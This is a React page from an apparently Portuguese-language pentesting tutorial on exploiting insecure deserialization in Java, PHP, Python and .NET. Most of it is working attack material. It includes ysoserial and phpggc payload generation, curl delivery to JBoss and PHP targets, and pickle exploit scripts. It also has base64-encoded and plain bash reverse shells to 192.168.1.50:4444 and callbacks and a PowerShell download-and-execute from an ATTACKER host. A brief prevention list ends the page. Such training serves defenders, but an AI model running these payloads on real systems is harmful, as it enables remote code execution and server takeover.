import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function Deserialization() {
  return (
    <PageContainer
      title="Insecure Deserialization — RCE via Objetos Serializados"
      subtitle="Explore vulnerabilidades de desserialização insegura em Java, PHP, Python e .NET. Inclui ysoserial, phpggc, geração de gadget chains, e identificação de endpoints vulneráveis."
      difficulty="avancado"
      timeToRead="30 min"
    >
      <h2>O que é Desserialização Insegura?</h2>
      <p>
        <strong>Serialização</strong> é o processo de converter um objeto em memória para um formato
        que pode ser armazenado ou transmitido (bytes, JSON, XML). <strong>Desserialização</strong> é
        o reverso — reconstruir o objeto a partir dos dados serializados. A vulnerabilidade ocorre
        quando a aplicação desserializa dados <strong>não confiáveis</strong> (input do usuário)
        sem validação, permitindo que o atacante injete objetos maliciosos que executam código
        durante a reconstrução.
      </p>

      <AlertBox type="danger" title="OWASP Top 10 — A08:2021">
        Desserialização insegura é uma das vulnerabilidades mais graves porque frequentemente
        resulta em RCE (execução remota de código) sem interação do usuário. Um único cookie
        ou parâmetro serializado malicioso pode comprometer todo o servidor.
      </AlertBox>

      <h2>Java — O Alvo Mais Comum</h2>
      <CodeBlock
        title="Identificar e explorar desserialização Java"
        code={`# ═══════════════════════════════════════════════════
# COMO IDENTIFICAR SERIALIZAÇÃO JAVA
# ═══════════════════════════════════════════════════
# Objetos Java serializados começam com bytes mágicos:
# Hex: AC ED 00 05
# Base64: rO0AB (quando o objeto está em base64)
#
# Procurar em:
# 1. Cookies (ViewState, JSESSIONID custom, etc.)
# 2. Headers HTTP customizados
# 3. Body de POST requests
# 4. Parâmetros GET
# 5. Campos hidden de formulários
# 6. Mensagens de WebSocket
#
# Se encontrar "rO0AB" em qualquer desses → serialização Java!
# Se encontrar bytes AC ED no Burp → serialização Java!

# Exemplo em cookie:
# Cookie: user=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9h...
# ↑ "rO0AB" no início = objeto Java serializado em base64!

# ═══════════════════════════════════════════════════
# POR QUE É PERIGOSO
# ═══════════════════════════════════════════════════
# Quando Java desserializa um objeto, ela executa
# automaticamente certos métodos como:
# - readObject()     — método custom de desserialização
# - readResolve()    — pós-processamento
# - finalize()       — garbage collection
#
# Se uma classe no classpath (bibliotecas do servidor) tem
# um readObject() que faz operações perigosas, o atacante
# pode criar um "gadget chain" — uma sequência de objetos
# que, quando desserializados, executam código arbitrário.
#
# Exemplo simplificado de gadget chain:
# Objeto A.readObject() → chama método de B →
# B processa dados → chama C.transform() →
# C.transform() executa Runtime.exec("comando")!

# ═══════════════════════════════════════════════════
# YSOSERIAL — GERADOR DE PAYLOADS
# ═══════════════════════════════════════════════════
# ysoserial gera objetos Java maliciosos que exploram
# gadget chains em bibliotecas populares.

# Baixar:
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Listar gadget chains disponíveis:
java -jar ysoserial-all.jar --help
# Payloads disponíveis (cada um explora uma biblioteca):
#
# CommonsCollections1  — Apache Commons Collections 3.1
# CommonsCollections2  — Apache Commons Collections 4.0
# CommonsCollections3  — Commons Collections 3.1
# CommonsCollections4  — Commons Collections 4.0
# CommonsCollections5  — Commons Collections 3.1
# CommonsCollections6  — Commons Collections 3.1 (mais estável)
# CommonsCollections7  — Commons Collections 3.1
# CommonsBeanutils1    — Commons Beanutils + Collections
# Spring1              — Spring Framework
# Spring2              — Spring Framework
# Groovy1              — Groovy
# JRMPClient           — Java RMI
# Jdk7u21              — JDK 7u21 (sem dependência externa!)
# FileUpload1          — Commons FileUpload
# Hibernate1           — Hibernate ORM
# Wicket1              — Apache Wicket

# ═══════════════════════════════════════════════════
# GERAR E ENVIAR PAYLOAD
# ═══════════════════════════════════════════════════

# Gerar payload raw (para enviar diretamente):
java -jar ysoserial-all.jar CommonsCollections6 "whoami" > payload.bin
# CommonsCollections6 = gadget chain a usar
# "whoami" = comando a executar
# payload.bin = objeto Java serializado malicioso

# Gerar payload base64 (para cookies/headers):
java -jar ysoserial-all.jar CommonsCollections6 "whoami" | base64 -w0
# Copiar o base64 e colocar no cookie/parâmetro

# Gerar payload com reverse shell:
java -jar ysoserial-all.jar CommonsCollections6 \\
  "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNTAvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" \\
  | base64 -w0
# O comando está em base64 para evitar caracteres especiais
# YmFzaC... = "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1"

# ═══════════════════════════════════════════════════
# QUAL GADGET CHAIN USAR?
# ═══════════════════════════════════════════════════
# Depende das bibliotecas no classpath do servidor!
# Se não sabe, testar várias:
for gc in CommonsCollections1 CommonsCollections2 CommonsCollections3 \\
  CommonsCollections4 CommonsCollections5 CommonsCollections6 \\
  CommonsCollections7 CommonsBeanutils1 Jdk7u21; do
  echo "[*] Testando $gc..."
  java -jar ysoserial-all.jar $gc "curl http://ATTACKER/hit-$gc" | base64 -w0 > /tmp/payload_$gc.txt
done
# Enviar cada payload — se receber callback → aquela chain funciona!

# ═══════════════════════════════════════════════════
# JBOSS / TOMCAT / JENKINS — ALVOS COMUNS
# ═══════════════════════════════════════════════════
# JBoss JMXInvokerServlet:
curl -X POST http://alvo:8080/invoker/JMXInvokerServlet \\
  --data-binary @payload.bin
# Se JBoss aceita objetos serializados neste endpoint!

# Jenkins CLI:
# Jenkins usa serialização Java no CLI (porta 50000)
# Ferramenta: https://github.com/foxglovesec/JavaUnserializeExploits`}
      />

      <h2>PHP — Desserialização com phpggc</h2>
      <CodeBlock
        title="Explorar unserialize() em PHP"
        code={`# ═══════════════════════════════════════════════════
# COMO FUNCIONA EM PHP
# ═══════════════════════════════════════════════════
# PHP serializa objetos com serialize() e desserializa com unserialize().
# Formato serializado PHP (texto legível):
# O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
# O = Object, 4 = tamanho do nome da classe ("User")
# s = string, i = integer, a = array, b = boolean

# Métodos mágicos executados na desserialização:
# __wakeup()   — chamado quando unserialize() é executado
# __destruct() — chamado quando o objeto é destruído
# __toString() — chamado quando objeto é convertido para string
#
# Se qualquer desses métodos faz algo perigoso (file_put_contents,
# exec, system, include, etc.) → gadget chain explorável!

# ═══════════════════════════════════════════════════
# PHPGGC — GERADOR DE GADGET CHAINS PHP
# ═══════════════════════════════════════════════════
git clone https://github.com/ambionics/phpggc
cd phpggc

# Listar gadget chains disponíveis:
./phpggc -l
# NAME                  VERSION       TYPE
# Laravel/RCE1          5.4.27        RCE
# Laravel/RCE2          5.5.39        RCE
# Laravel/RCE3          5.5.39        RCE
# Symfony/RCE1          3.4           RCE
# Symfony/RCE2          2.3.42        RCE
# WordPress/RCE1        4.7           RCE
# Guzzle/RCE1           6.0-6.3       RCE
# Monolog/RCE1          1.18          RCE
# Doctrine/RCE1         2.0           RCE
# ThinkPHP/RCE1         5.0           RCE
# Yii/RCE1              1.1.20        RCE
# ...

# Gerar payload:
./phpggc Laravel/RCE1 system "whoami"
# Output: objeto PHP serializado que executa whoami

# Com base64:
./phpggc Laravel/RCE1 system "whoami" -b
# -b = output em base64

# Com URL encoding:
./phpggc Laravel/RCE1 system "whoami" -u
# -u = URL encoded (para parâmetros GET/POST)

# Exemplo de exploração:
# Se a aplicação tem: unserialize($_COOKIE['data'])
# Enviar cookie: data=O:28:"Illuminate\\...RCE payload..."
curl -b "data=$(./phpggc Laravel/RCE1 system 'id' -u)" http://alvo.com/

# ═══════════════════════════════════════════════════
# ONDE PROCURAR UNSERIALIZE() EM PHP
# ═══════════════════════════════════════════════════
# 1. Cookies com dados serializados PHP
# 2. Campos hidden com formato O:... ou a:...
# 3. ViewState de frameworks PHP
# 4. Cache files (Redis, Memcached)
# 5. Sessions armazenadas em arquivos
# 6. Laravel: encrypted cookies usam serialize() internamente`}
      />

      <h2>Python — Pickle Deserialization</h2>
      <CodeBlock
        title="Explorar pickle.loads() em Python"
        code={`# ═══════════════════════════════════════════════════
# PICKLE — SERIALIZAÇÃO NATIVA DO PYTHON
# ═══════════════════════════════════════════════════
# pickle.dumps() serializa, pickle.loads() desserializa
# Pickle é EXTREMAMENTE perigoso porque pode executar
# código Python ARBITRÁRIO durante desserialização!

# Gerar payload pickle (Python):
cat << 'EOF' > gen_pickle.py
import pickle
import base64
import os

class Exploit(object):
    def __reduce__(self):
        # __reduce__ é chamado durante serialização
        # Retorna: (função_a_chamar, (argumentos,))
        return (os.system, ("whoami",))
        # Quando desserializado → executa os.system("whoami")

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
EOF

python3 gen_pickle.py
# Output: base64 do pickle malicioso
# gASVHAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=

# Reverse shell via pickle:
cat << 'EOF' > gen_pickle_revshell.py
import pickle
import base64
import os

class Exploit(object):
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1"'
        return (os.system, (cmd,))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
EOF

# ═══════════════════════════════════════════════════
# ONDE PROCURAR PICKLE INSEGURO
# ═══════════════════════════════════════════════════
# 1. APIs Flask/Django que aceitam dados serializados
# 2. Cookies Flask com pickle (signing key fraca)
# 3. Redis/Memcached armazenando pickles
# 4. Celery tasks (mensagens com pickle)
# 5. PyYAML com yaml.load() (sem Loader=SafeLoader!)
# 6. Parâmetros com base64 que decodificam para bytes`}
      />

      <h2>.NET — Desserialização</h2>
      <CodeBlock
        title="ViewState e formatters .NET"
        code={`# ═══════════════════════════════════════════════════
# .NET VIEWSTATE
# ═══════════════════════════════════════════════════
# ViewState é um campo hidden em forms ASP.NET:
# <input type="hidden" name="__VIEWSTATE" value="base64..." />
#
# Se ViewState não está criptografado/assinado (MAC disabled):
# → Pode ser desserializado com payload malicioso!

# Verificar se MAC está desabilitado:
# Decodificar o ViewState base64 e procurar por padrões
# Ferramenta: viewstate-decoder

# ═══════════════════════════════════════════════════
# YSOSERIAL.NET
# ═══════════════════════════════════════════════════
# Versão .NET do ysoserial:
# https://github.com/pwntester/ysoserial.net

# Gerar payload (Windows):
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter \\
  -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/ps.ps1')"
# -g = gadget chain
# -f = formatter (BinaryFormatter, SoapFormatter, Json.Net, etc.)
# -c = comando a executar

# Para ViewState:
ysoserial.exe -p ViewState -g TypeConfuseDelegate \\
  -c "cmd.exe /c whoami" \\
  --decryptionkey=XXXXXX \\
  --decryptionalg=AES \\
  --validationkey=XXXXXX \\
  --validationalg=SHA1

# ═══════════════════════════════════════════════════
# PREVENÇÃO (PARA O RELATÓRIO)
# ═══════════════════════════════════════════════════
# 1. NUNCA desserializar dados de fontes não confiáveis
# 2. Se necessário, usar formatos seguros (JSON, XML com schema)
# 3. Java: usar look-ahead deserialization filters
# 4. PHP: usar json_decode() em vez de unserialize()
# 5. Python: usar json em vez de pickle para dados externos
# 6. .NET: habilitar ViewState MAC validation
# 7. Implementar whitelist de classes permitidas`}
      />
    </PageContainer>
  );
}
